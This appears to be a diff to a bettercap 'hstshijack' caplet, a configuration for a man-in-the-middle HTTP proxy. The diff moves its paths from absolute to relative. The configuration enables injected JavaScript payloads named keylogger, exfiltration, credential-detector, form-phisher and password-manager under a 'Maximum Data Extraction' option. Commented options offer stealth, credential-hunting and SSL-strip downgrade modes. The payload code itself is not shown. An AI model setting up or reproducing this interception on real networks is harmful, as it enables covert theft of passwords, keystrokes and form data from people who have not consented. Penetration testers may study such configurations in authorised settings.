@@ -12,11 +12,11 @@
 ###############################################################################
 
 # Set custom paths for SSL logging
-set hstshijack.ssl.domains /tmp/hstshijack.ssl.domains
-set hstshijack.ssl.index /tmp/hstshijack.ssl.index
+set hstshijack.ssl.domains ./hstshijack.ssl.domains
+set hstshijack.ssl.index ./hstshijack.ssl.index
 
 # Whitelist for whitelisting trusted domains  
-set hstshijack.whitelist /usr/local/share/bettercap/caplets/hstshijack/whitelist.json
+set hstshijack.whitelist ./hstshijack/whitelist.json
 
 # Domains to completely ignore (bypass interception)
 set hstshijack.ignore \
@@ -34,55 +34,55 @@ set hstshijack.ignore \
 # Captures: keystrokes, form data, network activity, credentials
 #
 # set hstshijack.payloads \
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js,\
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js
+#   *:./hstshijack/payloads/hijack-advanced.js,\
+#   *:./hstshijack/payloads/keylogger-advanced.js,\
+#   *:./hstshijack/payloads/exfiltration-advanced.js
 
 # OPTION 2: Maximum Data Extraction (Full Intelligence)
 # Captures: ALL available data from browser
 #
 set hstshijack.payloads \
-  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
-  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js,\
-  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js,\
-  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/credential-detector.js,\
-  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/form-phisher-advanced.js,\
-  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/password-manager-advanced.js
+  *:./hstshijack/payloads/hijack-advanced.js,\
+  *:./hstshijack/payloads/keylogger-advanced.js,\
+  *:./hstshijack/payloads/exfiltration-advanced.js,\
+  *:./hstshijack/payloads/credential-detector.js,\
+  *:./hstshijack/payloads/form-phisher-advanced.js,\
+  *:./hstshijack/payloads/password-manager-advanced.js
 
 # OPTION 3: Stealth Mode (Minimal Detection)
 # Only core hijack and basic keylogging
 #
 # set hstshijack.payloads \
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js
+#   *:./hstshijack/payloads/hijack-advanced.js,\
+#   *:./hstshijack/payloads/keylogger-advanced.js
 
 # OPTION 4: Credential Hunting (Focus on Sensitive Data)
 # Only extracts credentials, passwords, API keys
 #
 # set hstshijack.payloads \
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/credential-detector.js,\
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js
+#   *:./hstshijack/payloads/credential-detector.js,\
+#   *:./hstshijack/payloads/exfiltration-advanced.js
 
 # OPTION 5: Form Targeting (Focused on Authentication)
 # Form harvesting + password manager exploitation
 #
 # set hstshijack.payloads \
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/form-phisher-advanced.js,\
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/password-manager-advanced.js
+#   *:./hstshijack/payloads/form-phisher-advanced.js,\
+#   *:./hstshijack/payloads/password-manager-advanced.js
 
 # OPTION 6: HTTPS Downgrade Attack (SSL Strip)
 # Forces all HTTPS traffic to HTTP for maximum interception
 #
 # set hstshijack.payloads \
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip-advanced.js,\
-#   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js
+#   *:./hstshijack/payloads/sslstrip-advanced.js,\
+#   *:./hstshijack/payloads/keylogger-advanced.js
 
 ###############################################################################
 # HTTP Proxy Configuration
 ###############################################################################
 
 # Load the main hstshijack proxy script
-set http.proxy.script /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.script ./hstshijack/hstshijack.js
 
 # Enable HTTP proxy
 http.proxy on
